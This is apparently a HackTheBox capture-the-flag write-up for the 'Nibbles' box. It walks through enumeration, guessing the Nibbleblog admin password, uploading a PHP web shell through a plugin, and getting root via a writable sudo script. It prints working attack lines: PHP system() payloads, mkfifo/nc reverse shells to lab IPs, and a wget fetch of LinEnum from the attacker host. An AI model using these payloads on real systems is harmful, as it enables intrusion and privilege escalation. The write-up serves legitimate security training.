---
backLabel: Writeups
backLink: /writeups/
summary: The First HTB Box you'll solve in the CPTS Path
tags:
  - rce
  - upload
  - php
  - PrivEsc
difficulty: Easy
platform: HackTheBox
category: Web
date: 2026-08-15
title: HTB — Nibbles
layout: layouts/entry-detail.njk
---

# About This Box

An easy rated Linux box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges.

|Machine Name|Nibbles|
|---|---|
|Creator|mrb3n|
|Operating System|Linux|
|Difficulty|Easy|
|User Path|Web|
|Privilege Escalation|World-writable File / Sudoers Misconfiguration|
|Ippsec Video|[https://www.youtube.com/watch?v=s_0GcRGv6Ds](https://www.youtube.com/watch?v=s_0GcRGv6Ds)|
|Walkthrough|[https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)|

# Let's start

## Enumeration

### What we know so far

We already know ==the target's IP address==, that it is ==Linux==, and has a ==web-related attack vector==.

> We call this a ==grey-box approach== because we have some information about the target.

> This is why the thorough enumeration is critical and is often an iterative process.

### Nmap

It is essential to get in the habit of taking extensive notes and saving all console output early on. The better we get at this while practicing, the more second nature it will become when on real-world engagements. Proper notetaking is critical for us as penetration testers and will significantly speed up the reporting process and ensure no evidence is lost.

So let's start with this ==`nmap`== command:

```shell
nmap -sV --open -oA nibbles_initial_scan <target IP>
```

The scan resulted in:

![Screenshot 2026-08-15 123836.png](Screenshot%202026-08-15%20123836.png)

So we can see that the HOST is ==likely Ubuntu Linux== and exposes an ==Apache web server on port 80== and an ==OpenSSH server on port 22==.

Also, our 3 formats of scan (the result of `-oA`) were created in our working directory.

Now before we start poking around at the open ports, we can run a full TCP port scan using the command:

```shell
nmap -p- --open -oA nibbles_full_tcp_scan <Target IP>
```

This will ==check for any services running on non-standard ports== that our ==initial scan may have missed==. Since this scans all 65,535 TCP ports, it can take a long time so let's leave this running in the background and move on with our enumeration.

We can do some ==banner grabbing== using `nc` on the ports `nmap` gave us (22, 80) to confirm nmap's results:

On Port 22:

![Screenshot 2026-08-15 124441.png](Screenshot%202026-08-15%20124441.png)

On Port 80:

![Screenshot 2026-08-15 124447.png](Screenshot%202026-08-15%20124447.png)

Back to our nmap full TCP scan terminal, the scan has finished and has not found any additional ports. Let's perform an nmap script scan using the `-sC` flag.

==These scripts can be intrusive, so it is always important to understand exactly how our tools work.==

We run this command:

```shell
nmap -sC -p 22,80 -oA nibbles_script_scan <Target IP>
```

The results didn't add any additional information:

![Screenshot 2026-08-15 125050.png](Screenshot%202026-08-15%20125050.png)

So let's round out our nmap enumeration using the `http-enum` script, which can be used to enumerate common web application directories:

![Screenshot 2026-08-15 125057.png](Screenshot%202026-08-15%20125057.png)

As you can see it did not uncover anything useful.

## Web Footprinting

We can use `whatweb` to try to identify the web application in use.

![Screenshot 2026-08-15 130039.png](Screenshot%202026-08-15%20130039.png)

This tool does not identify any standard web technologies in use. Browsing to the target in Firefox shows us a simple "Hello world!" message.

Checking the page source reveals an interesting comment mentioning a directory named `nibbleblog`. Let us check this with `whatweb`:

![Screenshot 2026-08-15 130212.png](Screenshot%202026-08-15%20130212.png)

Now we are starting to get a better picture of things. We can see some of the technologies in use such as HTML5, jQuery, and PHP. We can also see that the site is running Nibbleblog, which is a free blogging engine built using PHP.

## Directory Enumeration

Browsing to the `/nibbleblog` directory in Firefox, we do not see anything exciting on the main page.

==A quick Google search for "nibbleblog exploit"== yields the Nibbleblog File Upload Vulnerability. The flaw allows an ==authenticated attacker to upload and execute arbitrary PHP code on the underlying web server==. The Metasploit module in question works for version `4.0.3`. We do not know the exact version of Nibbleblog in use yet, but it is a good bet that it is vulnerable to this. If we look at the source code of the Metasploit module, we can see that the exploit uses user-supplied credentials to authenticate the admin portal at `/admin.php`.

Let us use Gobuster to be thorough and check for any other accessible pages/directories:

![Screenshot 2026-08-15 130630.png](Screenshot%202026-08-15%20130630.png)

Gobuster finishes very quickly and confirms the presence of the `admin.php` page. We can check the README page for interesting information, such as the version number:

![Screenshot 2026-08-15 130956.png](Screenshot%202026-08-15%20130956.png)

So we validate that version 4.0.3 is in use, confirming that this version is likely vulnerable to the Metasploit module (==though this could be an old README page==). Nothing else interesting pops out at us. Let us check out the admin portal login page.

Now, to use the exploit mentioned above, we will need valid admin credentials. We can try some authorization bypass techniques and common credential pairs manually, such as `admin:admin` and `admin:password`, to no avail. There is a reset password function, but we receive an e-mail error. Also, too many login attempts too quickly trigger a lockout with the message `Nibbleblog security error - Blacklist protection`.

Let us go back to our directory brute-forcing results. The 200 status codes show pages/directories that are directly accessible. The 403 status codes in the output indicate that access to these resources is forbidden. Finally, the 301 is a permanent redirect. Let us explore each of these. Browsing to `nibbleblog/themes/`, we can see that directory listing is enabled on the web application.

Browsing to `nibbleblog/content` shows some interesting subdirectories: `public`, `private`, and `tmp`. Digging around for a while, we find a `users.xml` file which at least seems to confirm the username is indeed `admin`. It also shows blacklisted IP addresses. We can request this file with cURL and prettify the XML output using [xmllint](https://linux.die.net/man/1/xmllint):

![Screenshot 2026-08-15 131350.png](Screenshot%202026-08-15%20131350.png)

At this point, we have a valid username but no password. Searches of Nibbleblog related documentation show that the password is set during installation, and there is no known default password. Up to this point, we have the following pieces of the puzzle:

- A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability
- An admin portal at `nibbleblog/admin.php`
- Directory listing which confirmed that `admin` is a valid username
- Login brute-forcing protection blacklists our IP address after too many invalid login attempts — this takes login brute-forcing with a tool such as Hydra off the table

There are no other ports open, and we did not find any other directories, which we can confirm by performing additional directory brute-forcing against the root of the web application:

![Screenshot 2026-08-15 131554.png](Screenshot%202026-08-15%20131554.png)

Taking another look through all of the exposed directories, we find a `config.xml` file:

![Screenshot 2026-08-15 131740.png](Screenshot%202026-08-15%20131740.png)

Checking it, hoping for passwords, proves fruitless. ==BUT== we do see two mentions of `nibbles` in the site title as well as the notification e-mail address — and it's also the name of the box — so here we can ask ourselves: ==Could this be the admin password?==

When performing ==password cracking== offline with a tool such as Hashcat or attempting to guess a password, ==it is important to consider all of the information in front of us==. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) ==using a wordlist generated by crawling their website using a tool such as CeWL==.

And yes, it did work — `nibbles` was indeed the password.

==This shows us how crucial thorough enumeration is.== Let us recap what we have found so far:

- We started with a simple nmap scan showing two open ports
- Discovered an instance of Nibbleblog
- Analyzed the technologies in use using `whatweb`
- Found the admin login portal page at `admin.php`
- Discovered that directory listing is enabled and browsed several directories
- Confirmed that `admin` was the valid username
- Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
- Uncovered clues that led us to a valid admin password of `nibbles`

This proves that we need a clear, repeatable process that we will use time and time again, no matter if we are attacking a single box on HTB, performing a web application penetration test for a client, or attacking a large Active Directory environment.

==Keep in mind that iterative enumeration, along with detailed notetaking, is one of the keys to success in this field.==

## Initial Foothold

Now we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. We know a Metasploit module will likely work for this, but let us enumerate the admin portal for other avenues of attack. Looking around a bit, we see the following pages:

| Page | Contents |
|---|---|
| Publish | Making a new post, video post, quote post, or new page. Could be interesting. |
| Comments | Shows no published comments |
| Manage | Allows us to manage posts, pages, and categories. Not overly interesting. |
| Settings | Confirms the vulnerable version 4.0.3 is in use. Nothing else valuable. |
| Themes | Allows us to install a new theme from a pre-selected list. |
| Plugins | Allows us to configure, install, or uninstall plugins. The "My image" plugin allows us to upload an image file — could this be abused to upload PHP code? |

Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page.

![Nibbleblog plugins page](Nibbleblog%20plugins%20page.png)

Let us attempt to use this plugin to ==upload a snippet of PHP code instead of an image==. The following snippet can be used to test for code execution:

```php
<?php system('id'); ?>
```

Save this code to a file and then click on the Browse button and upload it.

We get a bunch of errors in the page, but it seems like the file may have uploaded.

Now we have to ==find out where the file uploaded== if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last-modified date, meaning that our upload was successful. Let us check and see if we have command execution:

![Screenshot 2026-08-15 145750.png](Screenshot%202026-08-15%20145750.png)

==We do!== It looks like we have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context. Let us ==modify our PHP file to obtain a reverse shell== and start poking around the server.

Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier, there are many reverse shell cheat sheets out there — PayloadAllTheThings and HighOn.Coffee are two great ones.

Let us use the following Bash reverse shell one-liner and add it to our PHP script:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

We upload the file again and start a netcat listener in our terminal:

```shell
nc -lvnp <LISTENING PORT OF OUR CHOICE>
```

Now to execute the reverse shell we either `curl` the image page again or in our browser we browse to `http://nibbleblog/content/private/plugins/my_image/image.php`.

Back in our netcat we can see that we got a response. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell — the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc.

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

The command above fails as Python2 seems to be missing from the system! Let's check for Python3:

```shell
which python3
```

And surely it exists, so it can get us to a friendlier shell:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then we `cd` to `/home/nibbler`, where we find the `user.txt` flag as well as a zip file `personal.zip`.

## Privilege Escalation

Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the `personal.zip` file and see a file called `monitor.sh`.

![Screenshot 2026-08-15 150459.png](Screenshot%202026-08-15%20150459.png)

The shell script `monitor.sh` is a monitoring script, and it is ==owned by our `nibbler` user== and ==writeable==.

Let us put this aside for now and pull in `LinEnum.sh` to perform some automated privilege escalation checks. First, download the script to your local attack VM or the Pwnbox and then start a Python HTTP server using the command:

```shell
sudo python3 -m http.server 8080
```

Back on the target, type the following to download the script:

```shell
wget http://<your ip>:8080/LinEnum.sh
```

If successful, we will see a 200 success response on our Python HTTP server. Once the script is pulled over, make it executable and run it:

```shell
chmod +x LinEnum.sh
./LinEnum.sh
```

We see a ton of interesting output, but what immediately catches the eye are sudo privileges:

![Screenshot 2026-08-15 150741.png](Screenshot%202026-08-15%20150741.png)

The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` ==with root privileges==. Being that we have full control over that file, ==if we append a reverse shell one-liner to the end of it and execute with sudo we should get a reverse shell back as the root user==. Let us edit the `monitor.sh` file to append a reverse shell one-liner:

```shell
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.146 7423 >/tmp/f' | tee -a monitor.sh
```

> ==IMPORTANT NOTE==: It is crucial, if we ever encounter a situation where we can leverage a writeable file for privilege escalation, that we only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption.

Now we execute the script with `sudo`:

```shell
sudo /home/nibbler/personal/stuff/monitor.sh
```

Finally, catch the root shell on our new waiting `nc` listener:

![Screenshot 2026-08-15 151113.png](Screenshot%202026-08-15%20151113.png)

From here, we can grab the `root.txt` flag.
